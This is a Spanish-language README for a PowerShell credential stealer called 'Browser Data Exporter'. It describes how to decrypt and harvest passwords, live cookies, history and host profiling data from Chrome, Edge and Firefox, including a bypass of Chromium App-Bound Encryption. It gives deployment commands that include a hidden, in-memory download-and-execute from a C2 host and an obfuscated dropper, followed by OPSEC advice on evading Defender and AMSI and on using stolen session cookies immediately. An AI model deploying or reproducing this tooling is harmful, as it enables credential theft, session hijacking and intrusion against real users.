```
╔════════════════════════════════════════════════════════════════════╗
║                                                                    ║
║    ██████╗ ██████╗  ██████╗ ██╗    ██╗███████╗███████╗██████╗      ║
║    ██╔══██╗██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔════╝██╔══██╗     ║
║    ██████╔╝██████╔╝██║   ██║██║ █╗ ██║███████╗█████╗  ██████╔╝     ║
║    ██╔══██╗██╔══██╗██║   ██║██║███╗██║╚════██║██╔══╝  ██╔══██╗     ║
║    ██████╔╝██║  ██║╚██████╔╝╚███╔███╔╝███████║███████╗██║  ██║     ║
║    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚══╝╚══╝ ╚══════╝╚══════╝╚═╝  ╚═╝     ║
║                                                                    ║
║  ┌──────────────────────────────────────────────────────────────┐  ║
║  │   D A T A   E X P O R T E R                                  │  ║
║  │   credenciales · cookies · historial · perfilado de host     │  ║
║  │   windows · powershell 5.1 · v1.0                            │  ║
║  └──────────────────────────────────────────────────────────────┘  ║
║                                                                    ║
╚════════════════════════════════════════════════════════════════════╝

   [ POWERSHELL 5.1 ]  [ WINDOWS 10 | 11 ]  [ CHROME v80→latest ]
   [ EDGE TODOS LOS CANALES ]  [ FIREFOX NSS OFFLINE ]  [ ACTIVO ]

   Un script. Un host. Todos los navegadores. Rompe App-Bound
   Encryption de Chromium 127+ vía COM IElevator, descifra
   AES-256-GCM con BCrypt y perfila la máquina en una pasada.
```

---

```
┌──────────────────────────────────────────────────────────────────┐
│  TL;DR                                                           │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  powershell -NoP -EP Bypass -W Hidden -File .\Run.ps1            │
│                                                                  │
│  → C:\BrowserExport_<timestamp>\ en ~60s                         │
│  → contraseñas en claro · cookies vivas · perfil del host        │
│  → sin escribir el payload a disco                               │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

```
╔══════════════════════════════════════════════════════════════════╗
║  01 ── CAPACIDADES                                                ║
╚══════════════════════════════════════════════════════════════════╝
```

```
┌────────────────────────────┬────────┬────────┬─────────────┐
│                            │ CHROME │  EDGE  │   FIREFOX   │
├────────────────────────────┼────────┼────────┼─────────────┤
│ Contraseñas descifradas    │  [OK]  │  [OK]  │  offline    │
│ Cookies descifradas (CSV)  │  [OK]  │  [OK]  │     --      │
│ Cookies binarias (.db)     │  [OK]  │  [OK]  │    [OK]     │
│ Historial (5.000 URLs)     │  [OK]  │  [OK]  │    [OK]     │
│ Marcadores                 │  [OK]  │  [OK]  │    [OK]     │
│ Perfiles múltiples         │  [OK]  │  [OK]  │    [OK]     │
│ key4.db / cert9.db         │   --   │   --   │    [OK]     │
│ Session store / pestañas   │   --   │   --   │    [OK]     │
│ DPAPI clásico  (<= v126)   │  [OK]  │  [OK]  │     --      │
│ App-Bound Enc. (v127+)     │  [OK]  │  [OK]  │     --      │
│ AES-256-GCM vía BCrypt     │  [OK]  │  [OK]  │     --      │
└────────────────────────────┴────────┴────────┴─────────────┘
```

```
┌──────────────────────────────────────────────────────────────────┐
│  DEL HOST                                                        │
├──────────────────────────────────────────────────────────────────┤
│  IP pública y locales      MACs y adaptadores activos            │
│  Hostname / usuario        Dominio o grupo de trabajo            │
│  Fabricante / modelo       Zona horaria                          │
│  SO, build, instalación    Último arranque                       │
│  CPU / RAM / discos        Usuarios locales + último logon       │
│  Top 30 software instalado (por fecha)                           │
└──────────────────────────────────────────────────────────────────┘
```

---

```
╔══════════════════════════════════════════════════════════════════╗
║  02 ── CADENA DE DESCIFRADO                                       ║
╚══════════════════════════════════════════════════════════════════╝
```

```
        ┌──────────────────┐
        │   Local State    │
        │   os_crypt.*     │
        └────────┬─────────┘
                 │
    ┌────────────▼──────────────────────────────┐
    │  prefijo DPAPI  ──>  ProtectedData        │   <= Chrome/Edge v126
    │                      .Unprotect(CurrentUser)
    └────────────┬──────────────────────────────┘
                 │  prefijo APPB
    ┌────────────▼──────────────────────────────┐
    │  IElevator::DecryptData  (COM)            │   >= v127
    │  Stable · Beta · Dev · Canary             │   8 CLSIDs
    └────────────┬──────────────────────────────┘
                 │  clave maestra AES-256
    ┌────────────▼──────────────────────────────┐
    │  [3B pref][12B nonce][ciphertext][16B tag]│
    │  AES-256-GCM  ·  bcrypt.dll  ·  P/Invoke  │
    └────────────┬──────────────────────────────┘
                 │
    ┌────────────▼──────────────────────────────┐
    │  texto claro  ──>  CSV                    │
    └───────────────────────────────────────────┘
```

```
┌─────────┬──────────────────────────┬──────────────────────────┐
│  CANAL  │  CLSID CHROME            │  CLSID EDGE              │
├─────────┼──────────────────────────┼──────────────────────────┤
│ Stable  │ 708860E0-…-7D867DD3675B  │ 1ECFD30A-…-3EE63E2A6B1D  │
│ Beta    │ DD2646BA-…-038691A68FC2  │ 57B3B49E-…-BDE1CC6DF4B6  │
│ Dev     │ DA7FDCA5-…-0740584DE7DA  │ DFE0B66C-…-9D69C8B97F2E  │
│ Canary  │ 704C2872-…-0A534313C42B  │ 0B1B47E6-…-8DD64E3EDCA3  │
└─────────┴──────────────────────────┴──────────────────────────┘
```

```
  !!  BCrypt en vez de AesGcm: .NET Framework 4.x no lo tiene.
  !!  El Add-Type va ANTES de $ErrorActionPreference = SilentlyContinue.
  !!  Si la compilación falla, el fallo tiene que doler.
```

---

```
╔══════════════════════════════════════════════════════════════════╗
║  03 ── CONTENIDO DEL PAQUETE                                      ║
╚══════════════════════════════════════════════════════════════════╝
```

```
┌──────────────────────────┬────────────────────────────┬──────────────┐
│ ARCHIVO                  │ ROL                        │ DÓNDE CORRE  │
├──────────────────────────┼────────────────────────────┼──────────────┤
│ Export-BrowserData.ps1   │ payload · recolección      │ host         │
│ Obfuscator.ps1           │ XOR rotativo + Base64      │ tu máquina   │
│ Run.ps1                  │ dropper con blob embebido  │ host         │
│ MANUAL_DESCIFRADO.txt    │ instrucciones + clave      │ referencia   │
└──────────────────────────┴────────────────────────────┴──────────────┘
```

```
  >> Run.ps1 y MANUAL_DESCIFRADO.txt se REGENERAN. Nunca a mano.
```

---

```
╔══════════════════════════════════════════════════════════════════╗
║  04 ── DESPLIEGUE                                                 ║
╚══════════════════════════════════════════════════════════════════╝
```

**Empaquetar** — una vez, tu máquina:

```powershell
powershell -ExecutionPolicy Bypass -File .\Obfuscator.ps1
```

**Ejecutar** — host objetivo:

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File .\Run.ps1
```

**En memoria, desde C2:**

```powershell
powershell -NoP -EP Bypass -W Hidden -C "iex (iwr -UseB https://<host>/Run.ps1 -UseBasicParsing)"
```

**Destino custom:**

```powershell
.\Export-BrowserData.ps1 -OutputDir "D:\stage\out"
```

---

```
╔══════════════════════════════════════════════════════════════════╗
║  05 ── ANATOMÍA DE LA SALIDA                                      ║
╚══════════════════════════════════════════════════════════════════╝
```

```
C:\BrowserExport_<timestamp>\
│
├── Chrome\
│   ├── Passwords.csv        URL · usuario · password en claro
│   ├── Cookies.csv          dominio · nombre · valor · flags
│   ├── Cookies.db           copia binaria (respaldo)
│   ├── History.csv          últimas 5.000 URLs
│   └── Bookmarks.csv
│
├── Edge\                    idéntico
│
├── Firefox\<perfil>\
│   ├── logins.json          credenciales cifradas (ASN.1)
│   ├── key4.db  cert9.db    material de clave
│   ├── cookies.sqlite  places.sqlite  favicons.sqlite
│   ├── sessionstore.jsonlz4 pestañas abiertas
│   ├── prefs.js  permissions.sqlite
│   ├── Logins_Cifrados.csv  usuario/pass en Base64
│   └── History.csv  Bookmarks.csv
│
└── Logs\
    └── SistemaInfo.txt      perfilado completo del host
```

```
  !!  Cookies.db y key4.db están para reparsear offline.
  !!  Las cookies del CSV son válidas hasta que el usuario cierre
  !!  sesión. Usarlas YA.
```

**Recuperación de Firefox** — offline, fuera del host:

```bash
python3 firefox_decrypt.py --key4db key4.db --export-passwords logins.json
```

Los `Logins_Cifrados.csv` llevan Base64 del blob ASN.1 original: recuperables con
`key4.db`, nunca texto claro en el host.

---

```
╔══════════════════════════════════════════════════════════════════╗
║  06 ── BAJO EL CAPÓ                                               ║
╚══════════════════════════════════════════════════════════════════╝
```

```
  [1]  CERO escritura de payload a disco
       XOR rotativo (clave 18B) + Base64 + Invoke-Expression.
       La clave va como byte array sin etiqueta: el archivo
       parece inerte a un análisis superficial.

  [2]  COPIA-ANTES-DE-LEER
       Cada .db se copia a %TEMP% con nombre aleatorio para
       esquivar el lock del navegador vivo. Limpieza en finally.

  [3]  IDEMPOTENTE
       [PSTypeName]'AesGcmBcrypt' evita recompilar en reejecuciones.

  [4]  MULTI-PERFIL
       Default + todos los Profile N.

  [5]  TIMESTAMPS
       Epoch WebKit (1601) vía AddMicroseconds.
       Firefox con unixepoch.
```

---

```
╔══════════════════════════════════════════════════════════════════╗
║  07 ── REQUISITOS                                                 ║
╚══════════════════════════════════════════════════════════════════╝
```

```
┌──────────────────────────────────────────────────────────────────┐
│  [+]  Windows 10 / 11                                            │
│  [+]  PowerShell 5.1                                             │
│  [+]  .NET Framework 4.x                                         │
│  [+]  MISMO USUARIO que posee los perfiles                       │
│  [+]  Internet: api.ipify.org + PowerShell Gallery               │
└──────────────────────────────────────────────────────────────────┘
```

```
┌──────────────────────────────────────────────────────────────────┐
│  [-]  SYSTEM o -RunAs de terceros                                │
│       DPAPI y App-Bound están atados al contexto de usuario.     │
│       Sin credenciales DPAPI del dueño, no hay clave maestra.    │
└──────────────────────────────────────────────────────────────────┘
```

```
  !!  El parseo SQLite depende de PSSQLite. Sin PSGallery o sin
  !!  red, el script CORRE IGUAL pero sin contraseñas, historial
  !!  ni cookies. Solo quedan los binarios.
```

---

```
╔══════════════════════════════════════════════════════════════════╗
║  08 ── LIMITACIONES CONOCIDAS                                     ║
╚══════════════════════════════════════════════════════════════════╝
```

```
┌───┬────────────────────────────────────────┬──────────────────────┐
│ # │ PROBLEMA                               │ ARREGLO              │
├───┼────────────────────────────────────────┼──────────────────────┤
│ 1 │ Fallback sqlite3.exe declarado pero    │ Cablear la rama      │
│   │ DESCONECTADO: los llamadores filtran   │ tabulada o embeber   │
│   │ -eq 'PSSQLite'                         │ SQLitePCL            │
├───┼────────────────────────────────────────┼──────────────────────┤
│ 2 │ Cookies v20 usan SHA256(host_key) como │ Detectar v20 y      │
│   │ AAD y no se pasa → FALLAN y caen a     │ pasarlo como         │
│   │ DPAPI                                  │ pbAuthData           │
├───┼────────────────────────────────────────┼──────────────────────┤
│ 3 │ Sin contraseña maestra de Firefox      │ Prompt + key4.db     │
├───┼────────────────────────────────────────┼──────────────────────┤
│ 4 │ Solo Chrome/Edge: nada de Brave,       │ Tabla de CLSIDs      │
│   │ Opera, Vivaldi, Arc                    │ por producto         │
├───┼────────────────────────────────────────┼──────────────────────┤
│ 5 │ Sin perfiles DPAPI de otro usuario     │ CryptUnprotectData   │
│   │                                        │ con credenciales     │
├───┼────────────────────────────────────────┼──────────────────────┤
│ 6 │ Invoke-Item deja el explorador abierto │ Flag -Quiet          │
└───┴────────────────────────────────────────┴──────────────────────┘
```

---

```
╔══════════════════════════════════════════════════════════════════╗
║  09 ── OPSEC                                                      ║
╚══════════════════════════════════════════════════════════════════╝
```

```
  [!]  Defender va a picar por AMSI / iex.
       El payload plano es más ruidoso que Run.ps1.

  [!]  Install-Module deja rastro en
       Documents\WindowsPowerShell\Modules

  [!]  api.ipify.org es una request externa en claro
       con User-Agent de PowerShell

  [!]  Huella muy identificable: CSV con columnas en español
       y banner ASCII en SistemaInfo.txt

  [!]  -WindowStyle Hidden siempre. Nunca -NoExit.
```

---

```
╔══════════════════════════════════════════════════════════════════╗
║  10 ── AVISO                                                      ║
╚══════════════════════════════════════════════════════════════════╝
```

Recolecta secretos en claro. Cifrá antes de exfiltrar. Asumí que cada cookie
capturada es una sesión viva hasta que el usuario la revoque.

---

```
        ┌──────────────────────────────────────────────┐
        │  hecho para operadores que no quieren        │
        │  adivinar la versión del navegador           │
        │                                              │
        │  IElevator · BCrypt · DPAPI · PSSQLite       │
        └──────────────────────────────────────────────┘
```
